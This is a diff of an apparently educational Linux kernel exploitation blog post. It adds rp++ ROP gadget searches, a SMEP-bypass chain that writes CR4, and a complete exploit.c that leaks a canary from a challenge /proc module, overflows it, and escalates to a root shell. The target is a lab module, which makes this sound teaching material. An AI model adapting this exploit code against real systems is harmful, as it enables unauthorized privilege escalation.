@@ -234,14 +234,22 @@ proc_remove(proc_entry);
 &lt;/div>
 &lt;h2 id="building-a-rop-chain">Building a ROP Chain&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
-&lt;pre>&lt;code>~/pwnkernel/ $ rp++ -f linux-4.4
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
+&lt;pre>&lt;code>~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 3 --unique | grep 'cr4'
+0xffffffff8103a411: add eax, 0x01A7F8BA ; mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret ; (1 found)
+0xffffffff8103a416: mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret ; (1 found)
+...
+&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
+&lt;pre>&lt;code>~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 1 --unique | grep 'pop rax ; ret'
+0xffffffff8101b8d0: pop rax ; ret ; (66 found)
+...
+&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
 {
 &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">21&lt;/span>];
 payload[&lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
-payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff81001518&lt;/span>; &lt;span style="color:#75715e">// pop rdi; ret
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6f0&lt;/span>; &lt;span style="color:#75715e">// rdi = 0x6f0
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">19&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8102dab0&lt;/span>; &lt;span style="color:#75715e">// native_write_cr4
+payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8101b8d0&lt;/span>; &lt;span style="color:#75715e">// pop rax ; ret
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6f0&lt;/span>; &lt;span style="color:#75715e">// rax = 0x6f0
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">19&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8103a416&lt;/span>; &lt;span style="color:#75715e">// mov cr4, eax ; ... ; ret
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>
 payload[&lt;span style="color:#ae81ff">20&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
 write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span>);
@@ -368,6 +376,103 @@ popd
 &lt;p>We can run this script like before in order to be dropped into a root shell on our kernel emulator.&lt;/p>
 &lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
+&lt;div class="collapsable-code">
+&lt;input id="3" type="checkbox" checked />
+&lt;label for="3">
+&lt;span class="collapsable-code__language">c&lt;/span>
+&lt;span class="collapsable-code__title">exploit.c&lt;/span>
+&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
+&lt;/label>
+&lt;pre class="language-c" >&lt;code>
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;assert.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+unsigned long save_ss, save_sp, save_rf, save_cs;
+void shell()
+{
+system(&amp;#34;/bin/sh&amp;#34;);
+}
+void save_user_space()
+{
+/* save user-space */
+__asm__(
+&amp;#34;.intel_syntax noprefix;&amp;#34;
+&amp;#34;mov save_ss, ss;&amp;#34;
+&amp;#34;mov save_sp, rsp;&amp;#34;
+&amp;#34;pushf;&amp;#34;
+&amp;#34;pop save_rf;&amp;#34;
+&amp;#34;mov save_cs, cs;&amp;#34;
+&amp;#34;.att_syntax;&amp;#34;
+);
+}
+void load_user_space(unsigned long target)
+{
+/* return to user-space */
+__asm__(
+&amp;#34;.intel_syntax noprefix;&amp;#34;
+&amp;#34;swapgs;&amp;#34;
+&amp;#34;mov r15, save_ss;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, save_sp;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, save_rf;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, save_cs;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, %[rip];&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;iretq;&amp;#34;
+&amp;#34;.att_syntax;&amp;#34;
+: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
+);
+}
+void escalate_privileges()
+{
+/* escalate privileges */
+__asm__(
+&amp;#34;.intel_syntax noprefix;&amp;#34;
+&amp;#34;xor rdi, rdi;&amp;#34;
+&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
+&amp;#34;call rbx;&amp;#34;
+&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
+&amp;#34;mov rdi, rax;&amp;#34;
+&amp;#34;call rbx;&amp;#34;
+&amp;#34;.att_syntax;&amp;#34;
+);
+/* return to user-space */
+load_user_space((unsigned long)shell);
+}
+unsigned long leak_canary(int fd)
+{
+unsigned long leak[32];
+read(fd, leak, sizeof(unsigned long) * 32);
+return leak[16];
+}
+void overflow_buffer(int fd, unsigned long canary)
+{
+unsigned long payload[21];
+payload[16] = canary;
+payload[17] = 0xffffffff8101b8d0; // pop rax ; ret
+payload[18] = 0x6f0; // rax = 0x6f0
+payload[19] = 0xffffffff8103a416; // mov cr4, eax ; ... ; ret
+payload[20] = (unsigned long)escalate_privileges;
+write(fd, payload, sizeof(unsigned long) * 21);
+}
+int main(int argc, char **argv)
+{
+save_user_space();
+int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
+assert(fd &amp;gt; 0);
+/* leak stack canary */
+unsigned long canary = leak_canary(fd);
+printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
+overflow_buffer(fd, canary);
+return 0;
+}
+&lt;/code>&lt;/pre>
+&lt;/div>
 &lt;h2 id="appendix">Appendix&lt;/h2>
 &lt;ul>
 &lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
